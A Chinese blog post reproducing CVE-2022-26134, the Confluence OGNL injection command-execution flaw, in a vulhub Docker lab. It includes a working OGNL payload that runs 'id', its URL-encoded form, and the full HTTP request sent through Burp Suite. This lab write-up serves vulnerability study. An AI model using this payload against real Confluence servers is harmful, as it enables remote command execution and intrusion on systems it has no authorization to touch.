# 原创
：  Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）vulhub漏洞复现

# Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）vulhub漏洞复现

**Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）**

Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。

**漏洞复现**

`cd vulhub-master/`

`cd confluence/`

`cd CVE-2022-26134/`

`docker-compose up -d`

访问`192.168.126.128:8090`进入安装页面，申请试用版许可证。在填写数据库信息的页面，PostgreSQL数据库地址为`db`，数据库名称`confluence`，用户名密码均为`postgres`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/df5814bafdfd4e058a3d1acb98dcca08.png"/>

点击next

PostgreSQL数据库地址为`db`，数据库名称`confluence`，用户名密码均为`postgres`。

next<br/> <img alt="" src="https://img-blog.csdnimg.cn/8a9f6e9bd00447dbbc1eef28626e1e37.png"/>

登录

**攻击准备**，burpsuite抓包

构造payload：`/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/`

url编码：`/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/`

发送如下数据包：

`GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1 Host: 192.168.126.128:8090 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close`<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b4c7105b4223483fa3b0758896759a7a.png"/>

成功获取id
